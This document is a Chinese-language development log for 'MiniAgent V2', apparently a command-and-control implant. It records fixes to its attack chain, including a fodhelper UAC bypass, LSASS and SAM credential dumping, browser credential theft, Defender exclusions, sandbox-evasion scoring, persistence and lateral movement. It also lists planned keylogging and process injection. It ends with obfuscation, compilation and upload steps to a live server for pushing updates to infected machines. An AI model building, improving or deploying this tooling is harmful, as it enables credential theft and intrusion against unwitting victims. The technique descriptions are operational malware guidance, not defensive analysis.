# MiniAgent V2 缺陷分析与修复记录

> 版本: 21.0.0-cs | 更新日期: 2026-04-28

---

## 一、攻击链分析

原始设计的攻击链：
```
提权(UAC Bypass) → dump凭据 → 内网扫描 → 横向部署
       ↑
    v20 缺失这一环！整个链条断了
```

**v21 修复后：**
```
反沙箱检测 → ETW致盲 → Defender排除(UAC提权) → 持久化(分权限层) → 凭据窃取(自动UAC提权) → 内网扫描 → 横向部署
```

---

## 二、缺陷清单与修复状态

### 凭据窃取模块

| 功能 | v20 状态 | 问题 | v21 修复 |
|------|---------|------|---------|
| DumpLSASS | ❌ 失败 | 需要 SeDebugPrivilege，无 UAC bypass | ✅ 非 admin 时自动通过 fodhelper UAC bypass + comsvcs.dll MiniDump 提权转储 |
| DumpSAMHashes | ❌ 失败 | reg save HKLM\SAM 需要管理员 | ✅ 非 admin 时通过 UAC bypass 提权执行 reg save |
| DumpBrowserCreds | ⚠️ 部分 | 只扫 4 个硬编码 Profile | ✅ 动态枚举所有 Profile 目录（Default + Profile N） |
| DumpWiFiPasswords | ⚠️ 半残 | key=clear 需管理员才显密码 | ⚠️ 保持原样（非admin可获取SSID列表，密码需admin） |
| DumpCredentialManager | ⚠️ 部分 | 只能读当前用户凭据 | ⚠️ API 限制，无法跨用户（设计如此） |

### 内网模块

| 功能 | v20 状态 | 问题 | v21 修复 |
|------|---------|------|---------|
| HandleNetScan | ⚠️ 能用 | 纯 TCP Connect，动静大 | ⚠️ 保持（SYN扫描需raw socket/admin） |
| HandleLateralDeploy | ❌ 废的 | 依赖凭据但凭据获取失败；WinRM默认关 | ⚠️ 凭据获取已修复，WMI路径可用；WinRM仍依赖目标配置 |

### 基础设施

| 功能 | v20 状态 | 问题 | v21 修复 |
|------|---------|------|---------|
| 注册信息 IP | ❌ 空值 | GatherMetrics 未上报 ip 字段 | ✅ 添加本机 IPv4 地址到心跳上报 |
| 持久化权限 | ❌ 静默失败 | InstallAllLayers 不区分权限 | ✅ 非 admin 只装 HKCU/Task，admin 加装 HKLM/WMI |
| Defender 排除 | ❌ 缺失 | 无 Add-MpPreference | ✅ 启动时通过 UAC bypass 添加排除路径 |
| 反沙箱/反分析 | ❌ 缺失 | 无检测逻辑 | ✅ 评分制检测（RAM/CPU/磁盘/用户名/分析工具/运行时间） |

---

## 三、新增功能详细说明

### 1. UAC Bypass — `Evasion.RunElevated()`

**原理：** fodhelper.exe ms-settings 协议劫持
- 写入 `HKCU\Software\Classes\ms-settings\shell\open\command`
- fodhelper.exe 自动提权时读取该注册表并执行
- 无 UAC 弹窗（默认 UAC 级别下）

**前提条件：**
- 当前用户在 Administrators 组
- UAC 不是"始终通知"级别

**使用方式：**
```csharp
// 判断当前是否 admin
if (Evasion.IsAdmin()) { /* 直接执行 */ }
else { Evasion.RunElevated("命令", 超时ms); }
```

### 2. Defender 排除 — `Evasion.AddDefenderExclusion()`

添加以下排除：
- `%APPDATA%` — 持久化 VBS 存放目录
- `%TEMP%` — 临时文件操作目录
- `Startup` 目录 — 启动文件夹 VBS
- `powershell.exe` 进程
- `wscript.exe` 进程

### 3. 反沙箱 — `Evasion.IsSandbox()`

评分制检测（阈值 ≥ 4 分判定为沙箱）：

| 检测项 | 分值 |
|--------|------|
| RAM < 2GB | +2 |
| CPU核心 < 2 | +2 |
| 磁盘 < 60GB | +2 |
| 最近文件 < 3 | +1 |
| 用户名匹配沙箱名 | +2 |
| 检测到分析工具 | +3 |
| 系统运行 < 5分钟 | +1 |

---

## 四、仍然缺失的功能（同类 C2 常见）

| 功能 | 说明 | 优先级 |
|------|------|--------|
| 键盘记录器 | SetWindowsHookEx 低级键盘钩子 | 中 |
| 剪贴板监控 | 定时读取剪贴板内容 | 低 |
| 进程注入 | CreateRemoteThread/NtMapViewOfSection | 高 |
| Token 窃取 | ImpersonateLoggedOnUser 借用令牌 | 中 |
| 反调试 | IsDebuggerPresent + NtQueryInformationProcess | 低 |
| 自动文件搜集 | 扫描文档/密钥/配置文件 | 中 |
| Windows 服务持久化 | CreateService 注册系统服务 | 低 |

---

## 五、编译与部署

```powershell
# 1. 混淆
python obfuscate.py

# 2. 编译
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:MiniAgent_obf.dll /reference:System.dll /reference:System.Management.dll /reference:System.Core.dll /reference:System.Drawing.dll MiniAgent_obf.cs

# 3. 上传到服务器
scp MiniAgent_obf.dll root@47.115.222.73:/www/wwwroot/goo/data/agent-bin/

# 4. 向在线 agent 推送更新
```
